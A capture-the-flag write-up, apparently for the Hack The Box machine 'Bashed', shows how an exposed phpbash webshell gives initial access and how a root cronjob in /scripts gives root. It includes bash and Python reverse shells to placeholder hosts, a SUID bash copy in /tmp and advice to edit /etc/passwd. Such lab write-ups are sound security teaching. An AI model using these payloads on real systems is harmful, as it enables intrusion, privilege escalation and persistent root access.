# Bashed

## Reconnaissance:
***
### Open Ports: 

- 80 - Apache httpd 2.4.18
***

## Enumeration:

***
80 : Blog page giving hint ---> *phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!*

view-page-source : github link --> https://github.com/Arrexel/phpbash

gobuster : 10.10.10.68

- /uploads/
- /php/
- /css/
- /dev/ --> Interesting

http://10.10.10.68/dev/ : 2 php files: phpbash.min.php, phpbash.php

http://10.10.10.68/dev/phpbash.min.php : webshell

id: www-data --> this shell to our terminal

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

***
## Privileges Escalation

***
**LinEnum** : Look for important & juicy files.

***

2 users: scriptmanager, arrexel
scriptmanager : no password required

```bash
sudo -u scriptmanager
```

again run LinEnum : no juicy information

* start with `/`

interesting directory : /scripts/ --> 2 files: 
> test.py - scriptmanager
> test.txt - root

* on reading both the files it was observed that `test.py` was running inside a `cronjob` .
* Meaning, the file was getting executed as a root. Files inside `/scripts` are running by cronjob.
* Thus, we can create our own python file and execute commands by root

> #### Method 1:

python file : for root flag

```python
#!/usr/bin/python
import os
os.system('cat /root/root.txt >> /tmp/a');
```

python file : for user flag

```python
#!/usr/bin/python
import os
os.system('cat /home/arrexel/user.txt >> /tmp/b');
```

> #### Method 2:

reverse shell: with netcat (nc -nvlp PORT)

```python
#!/usr/bin/python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

> #### Method 3:

```python
#!/usr/bin/python
import os
os.system('cp /bin/bash /tmp/j33n1 && chown root:root /tmp/j33n1 && chmod 4755 /tmp/j33n1');
```

> #### Method 4:

 From j33n1 root give write perrmission to `/etc/passwd/` and add your current username and password(`/etc/shadow'`) to the file.
 
***

# Resources: 
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

----------------------------------------------------------------------------------------------------



 
